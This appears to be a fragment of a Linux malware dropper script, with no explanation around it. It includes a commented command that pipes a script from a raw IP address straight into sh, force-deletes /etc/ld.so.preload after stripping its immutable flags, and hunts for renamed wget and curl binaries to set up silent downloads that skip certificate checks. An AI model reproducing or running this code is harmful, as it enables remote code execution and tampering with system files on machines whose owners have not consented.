if [ -f "/usr/sbin/localhost.lock" ];then echo "dont do this @ home!!" && exit ; fi
# wget -O - http://45.9.148.35/chimaera/sh/setup.sh | sh

if [ -f "/etc/ld.so.preload" ]; then chattr -ia /etc/ld.so.preload ; rm -f /etc/ld.so.preload ; fi

shorten='-q --no-check-certificate -O'
DTF='wget -q --no-check-certificate -O'
	if [ -s "$(which mwget)" ]; then export DTF="mwget "$shorten; fi
	if [ -s "$(which wget2)" ]; then export DTF="wget2 "$shorten; fi
	if [ -s "$(which wge)" ]; then export DTF="wge "$shorten; fi
	if [ -s "$(which wdl)" ]; then export DTF="wdl "$shorten; fi
	if [ -s "$(which wget)" ]; then export DTF="wget "$shorten; fi
		if [ -s "$(which mcurl)" ]; then export DTF="mcurl -s -o"; fi	
		if [ -s "$(which curl2)" ]; then export DTF="curl2 -s -o"; fi
		if [ -s "$(which cur)" ]; then export DTF="cur -s -o"; fi
		if [ -s "$(which cdl)" ]; then export DTF="cdl -s -o"; fi
		if [ -s "$(which curl)" ]; then export DTF="curl -s -o"; fi
		

